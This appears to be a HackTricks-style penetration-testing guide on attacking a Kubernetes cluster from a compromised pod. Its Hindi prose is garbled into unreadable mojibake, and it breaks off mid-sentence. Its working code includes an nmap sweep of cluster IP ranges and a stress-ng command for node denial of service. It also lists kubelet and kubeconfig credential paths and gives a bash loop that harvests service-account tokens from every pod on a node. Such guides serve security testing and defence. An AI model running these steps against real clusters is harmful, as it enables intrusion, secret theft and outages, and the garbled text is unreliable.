# рдкреЙрдб рд╕реЗ рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдкрд░ рд╣рдорд▓рд╛

<details>

<summary><strong>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ рдФрд░ рд▓рд╛рдн рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ!</strong></summary>

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ рдпрджрд┐ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХрд▓ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг** рдХрд░реЗрдВред**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ,** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>

## **рдкреЙрдб рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдирд╛**

**рдпрджрд┐ рдЖрдк рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕рд╕реЗ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдиреЛрдб рдкрд░ рдкрд╣реБрдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

### рдкреЙрдб рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдирд╛

рдкреЙрдб рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ рдкрд╣рд▓реЗ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИ, рдЗрд╕рдХреЗ рд▓рд┐рдП рдХреБрдЫ рддрдХрдиреАрдХреЗрдВ рд╣реИрдВ:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

рдЖрдк рдЗрд╕ **рдкреЙрдб рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдХреЗ рд▓рд┐рдП рдбреЙрдХрд░ рдмреНрд░реЗрдХрдЖрдЙрдЯ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬрд┐рд╕реЗ рдЖрдкрдиреЗ рд╕рдВрдХреНрд░рдорд┐рдд рдХрд┐рдпрд╛ рд╣реИ:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

### рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

**рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдЬрд╛рдБрдЪ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╡рд┐рднрд╛рдЧ рдореЗрдВ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐:**

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

рдЖрдорддреМрд░ рдкрд░ рдкреЙрдбреНрд╕ рдореЗрдВ рдПрдХ **рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛ рдЯреЛрдХрди** рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ рдХреЗ рд╕рд╛рде рдХреБрдЫ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдЬреБрдбрд╝реЗ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ**, рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк **рджреБрд░реБрдкрдпреЛрдЧ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЕрдиреНрдп рдкреЙрдбреНрд╕ рдореЗрдВ **рдЪрд▓реЗ рдЬрд╛рдПрдВ** рдпрд╛ рдпрд╣рд╛рдВ рддрдХ тАЛтАЛрдХрд┐ рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП рдиреЛрдбреНрд╕ рд╕реЗ **рдирд┐рдХрд▓реЗрдВ**ред рджреЗрдЦреЗрдВ рдХрд┐ рдХреИрд╕реЗ:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

### рдХреНрд▓рд╛рдЙрдб рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

рдпрджрд┐ рдкреЙрдб рдХреЛ **рдХреНрд▓рд╛рдЙрдб рдорд╛рд╣реМрд▓** рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк **рдореЗрдЯрд╛рдбреЗрдЯрд╛ рдЕрдВрдд рдмрд┐рдВрджреБ** рд╕реЗ рдПрдХ рдЯреЛрдХрди рдХреЛ **рд▓реАрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреЗ рд╣реИрдВред

## рдЦреЛрдЬреЗрдВ рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛рдПрдВ

рдХреНрдпреЛрдВрдХрд┐ рдЖрдк рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдорд╛рд╣реМрд▓ рдореЗрдВ рд╣реИрдВ, рдпрджрд┐ рдЖрдк рдореМрдЬреВрджрд╛ рдкреЙрдб рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЖрдк рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд╣реАрдВ рдирд┐рдХрд▓ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдкрдХреЛ **рд╕рдВрднрд╛рд╡рд┐рдд рд╡рд┐рдХрд▓реНрдкрд╢реАрд▓ рд╕реЗрд╡рд╛рдПрдВ рдЦреЛрдЬрдиреА рдЪрд╛рд╣рд┐рдПред**

### рд╕реЗрд╡рд╛рдПрдВ

**рдЗрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП, рдЖрдк рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдорд╛рд╣реМрд▓ рдХреА рд╕рднреА рд╕реЗрд╡рд╛рдПрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:**
```
kubectl get svc --all-namespaces
```
рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, Kubernetes рдПрдХ рдлреНрд▓реИрдЯ рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рд╕реНрдХреАрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рднреАрддрд░ рдХрд┐рд╕реА рднреА рдкреЙрдб/рд╕реЗрд╡рд╛ рдХреЛ рджреВрд╕рд░реЗ рд╕реЗ рдмрд╛рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рднреАрддрд░ рдХреЗ **рдиреЗрдорд╕реНрдкреЗрд╕** рдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдХреЛрдИ рдиреЗрдЯрд╡рд░реНрдХ рд╕реБрд░рдХреНрд╖рд╛ рдкреНрд░рддрд┐рдмрдВрдз рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рдХреЛрдИ рднреА рд╡реНрдпрдХреНрддрд┐ рджреВрд╕рд░реЗ рдиреЗрдорд╕реНрдкреЗрд╕ рдХреЗ рд╕рд╛рде рдмрд╛рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### рд╕реНрдХреИрдирд┐рдВрдЧ

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдмреИрд╢ рд╕реНрдХреНрд░рд┐рдкреНрдЯ (рдПрдХ [Kubernetes рдХрд╛рд░реНрдпрд╢рд╛рд▓рд╛](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md) рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛) рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ IP рд░реЗрдВрдЬ рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХрд░реЗрдЧрд╛ рдФрд░ рд╕реНрдХреИрди рдХрд░реЗрдЧрд╛:
```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```
рдЗрд╕ рдкреЗрдЬ рдХреЛ рджреЗрдЦреЗрдВ рддрд╛рдХрд┐ рдЖрдк рд╕реАрдЦ рд╕рдХреЗрдВ рдХрд┐ рдЖрдк рдХреИрд╕реЗ **рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдХреА рд╡рд┐рд╢реЗрд╖ рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рдЕрдиреНрдп рдкреЙрдб/рдкреВрд░реНрдг рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:

{% content-ref url="pentesting-kubernetes-services.md" %}
[pentesting-kubernetes-services.md](pentesting-kubernetes-services.md)
{% endcontent-ref %}

### рд╕реНрдирд┐рдлрд┐рдВрдЧ

рдпрджрд┐ **рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рдкреЙрдб рдХрд┐рд╕реА рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕реЗрд╡рд╛ рдХреЛ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ** рдЬрд╣рд╛рдВ рдЕрдиреНрдп рдкреЙрдбреЛрдВ рдХреЛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдк **рд╕реНрдерд╛рдирд┐рдХ рд╕рдВрдЪрд╛рд░ рдХреЛ рд╕реНрдирд┐рдл рдХрд░рдХреЗ** рдЕрдиреНрдп рдкреЙрдбреЛрдВ рд╕реЗ рднреЗрдЬреЗ рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## рдиреЗрдЯрд╡рд░реНрдХ рд╕реНрдкреВрдлрд┐рдВрдЧ

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **ARP рд╕реНрдкреВрдлрд┐рдВрдЧ** (рдФрд░ рдЗрд╕рдХреЗ рдХрд╛рд░рдг **DNS рд╕реНрдкреВрдлрд┐рдВрдЧ**) рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВред рдлрд┐рд░, рдПрдХ рдкреЙрдб рдХреЗ рдЕрдВрджрд░, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **NET\_RAW рдХреНрд╖рдорддрд╛** (рдЬреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рд╣реЛрддреА рд╣реИ) рд╣реИ, рддреЛ рдЖрдк рдХрд╕реНрдЯрдо рдХреНрд░рд╛рдлреНрдЯреЗрдб рдиреЗрдЯрд╡рд░реНрдХ рдкреИрдХреЗрдЯ рднреЗрдЬ рд╕рдХреЗрдВрдЧреЗ рдФрд░ **рдПрдХ рд╣реА рдиреЛрдб рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рд╕рднреА рдкреЙрдбреЛрдВ рдХреЗ рд▓рд┐рдП ARP рд╕реНрдкреВрдлрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ MitM рд╣рдорд▓реЗ рдХрд░ рд╕рдХреЗрдВрдЧреЗ**ред
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ **рджреБрд╖реНрдЯ рдкреЙрдб** **DNS рд╕рд░реНрд╡рд░ рдХреЗ рд╕рд╛рде рдПрдХ рд╣реА рдиреЛрдб рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ**, рддреЛ рдЖрдк рдХреНрд▓рд╕реНрдЯрд░ рдореЗрдВ рд╕рднреА рдкреЙрдбреЛрдВ рдХреЗ рд▓рд┐рдП **DNS рд╕реНрдкреВрдлрд┐рдВрдЧ рд╣рдорд▓рд╛ рдХрд░ рд╕рдХреЗрдВрдЧреЗ**ред

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

## рдиреЛрдб DoS

рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдореЗрдирд┐рдлреЗрд╕реНрдЯ рдореЗрдВ рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХрд╛ рдХреЛрдИ рдирд┐рд░реНрджреЗрд╢ рдирд╣реАрдВ рд╣реИ рдФрд░ рдХрдВрдЯреЗрдирд░реНрд╕ рдХреЗ рд▓рд┐рдП **рд▓рд┐рдорд┐рдЯ рд░реЗрдВрдЬ рд▓рд╛рдЧреВ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ**ред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд░реВрдк рдореЗрдВ, рд╣рдо **рдкреЙрдб/рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯ рдЪрд▓ рд░рд╣реЗ рд╕рднреА рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рдЦрдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЕрдиреНрдп рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдХреЛ рднреВрдЦреЗ рд░рдЦрдХрд░ рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ рдбреАрдУрдПрд╕ рдкреНрд░рдХрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕реЗ [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng) рдЬреИрд╕реЗ рдЯреВрд▓ рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```
рдЖрдк `stress-ng` рдЪрд▓рд╛рддреЗ рд╕рдордп рдФрд░ рдЙрд╕рдХреЗ рдмрд╛рдж рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВред
```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```
## рдиреЛрдб рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди

рдпрджрд┐ рдЖрдкрдиреЗ **рдХрдВрдЯреЗрдирд░ рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ** рдХреА рд╕рдлрд▓рддрд╛ рдкреНрд░рд╛рдкреНрдд рдХреА рд╣реИ, рддреЛ рдЖрдк рдиреЛрдб рдореЗрдВ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдЪреАрдЬреЗрдВ рдкрд╛рдПрдВрдЧреЗ:

* **рдХрдВрдЯреЗрдирд░ рд░рдирдЯрд╛рдЗрдо** рдкреНрд░рдХреНрд░рд┐рдпрд╛ (Docker)
* рдиреЛрдб рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рдЕрдзрд┐рдХ **рдкреЙрдб/рдХрдВрдЯреЗрдирд░** рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдЗрд╕ рддрд░рд╣ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рдЕрдзрд┐рдХ рдЯреЛрдХрди)
* рдкреВрд░реА **рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо** рдФрд░ **рдУрдПрд╕** рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ
* **Kube-Proxy** рд╕реЗрд╡рд╛ рд╕реБрди рд░рд╣реА рд╣реИ
* **Kubelet** рд╕реЗрд╡рд╛ рд╕реБрди рд░рд╣реА рд╣реИред рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓реЗрдВ рджреЗрдЦреЗрдВ:
* рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* рдЕрдиреНрдп **рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рд╕рд╛рдорд╛рдиреНрдп рдлрд╝рд╛рдЗрд▓реЗрдВ**:
* `$HOME/.kube/config` - **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧ**
* `/etc/kubernetes/kubelet.conf`- **рд╕рд╛рдорд╛рдиреНрдп рдХреЙрдиреНрдлрд╝рд┐рдЧ**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **рдмреВрдЯрд╕реНрдЯреНрд░реИрдк рдХреЙрдиреНрдлрд╝рд┐рдЧ**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcd рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди**
* `/etc/kubernetes/pki` - **рдХреБрдмрд░рдиреЗрдЯреАрдЬрд╝ рдХреБрдВрдЬреА**

### рдиреЛрдб kubeconfig рдвреВрдВрдвреЗрдВ

рдпрджрд┐ рдЖрдк рдкрд╣рд▓реЗ рдЯрд┐рдкреНрдкрдгреАрдд рдХрд┐рдП рдЧрдП рдкрдереЛрдВ рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рднреА рдореЗрдВ kubeconfig рдлрд╝рд╛рдЗрд▓ рдирд╣реАрдВ рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ **kubelet рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рддрд░реНрдХ `--kubeconfig` рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**:
```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```
### рд░рд╣рд╕реНрдп рдЪреБрд░рд╛рдПрдБ

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА Kubernetes рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ, рддреЛ рдЖрдк рдЙрд╕ рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдореЛрдВ рдХрд╛ рдкрд╛рд▓рди рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

1. рдкрд╣рд▓реЗ, рдЖрдкрдХреЛ рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рдХреЗ рдирд╛рдорд╕реНрдерд╛рди (namespace) рдХреЛ рдЬрд╛рдирдирд╛ рд╣реЛрдЧрд╛ред рдЖрдк `kubectl get pods` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

2. рдЕрдЧрд▓рд╛ рдХрджрдо рд╣реИ рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рдХреЗ рдХрдВрдЯреЗрдирд░ рдХрд╛ рдирд╛рдо рдЬрд╛рдирдирд╛ред рдЖрдк `kubectl describe pod <pod_name> -n <namespace>` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЗрд╕рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

3. рдЕрдм, рдЖрдкрдХреЛ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рдПрдХ рд╢реЗрд▓ рд╕рддреНрд░ рд╢реБрд░реВ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред рдЖрдк `kubectl exec -it <pod_name> -n <namespace> -- /bin/sh` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╢реЗрд▓ рд╕рддреНрд░ рд╢реБрд░реВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

4. рд╢реЗрд▓ рд╕рддреНрд░ рдХреЗ рдЕрдВрджрд░, рдЖрдк рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк `/bin/sh` рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓реЛрдВ рдФрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред

рдЗрд╕ рддрд░рд╣, рдЖрдк Kubernetes рдкреЙрдб рдХреЗ рдЕрдВрджрд░ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд░рд╣рд╕реНрдпреЛрдВ рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВред
```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```
рд╕реНрдХреНрд░рд┐рдкреНрдЯ [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ **рдЕрдиреНрдп рдкреЙрдб рдХреЗ рдЯреЛрдХрди рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдЧрд╛ рдФрд░ рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдЙрдирдХреЗ рдкрд╛рд╕ рдЖрдкрдХреА рдЦреЛрдЬреА рдЧрдИ рдЕрдиреБрдорддрд┐ рд╣реИ** (рдЖрдкрдХреЛ 1 рд╕реЗ 1 рджреЗрдЦрдиреЗ рдХреА рдмрдЬрд╛рдп):
```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```
### рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдбреЗрдордирд╕реЗрдЯ

рдПрдХ рдбреЗрдордирд╕реЗрдЯ рдПрдХ **рдкреЙрдб** рд╣реИ рдЬреЛ **рдХреНрд▓рд╕реНрдЯрд░ рдХреЗ рд╕рднреА рдиреЛрдбреЛрдВ рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдПрдХ рдбреЗрдордирд╕реЗрдЯ рдХреЛ рдПрдХ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рд╕реЗрд╡рд╛ рдЦрд╛рддрд╛** рдХреЗ рд╕рд╛рде рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ **рд╕рднреА рдиреЛрдбреЛрдВ** рдореЗрдВ рдЖрдкрдХреЛ рдЙрд╕ **рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рд╕реЗрд╡рд╛ рдЦрд╛рддреЗ** рдХрд╛ **рдЯреЛрдХрди** рдорд┐рд▓реЗрдЧрд╛ 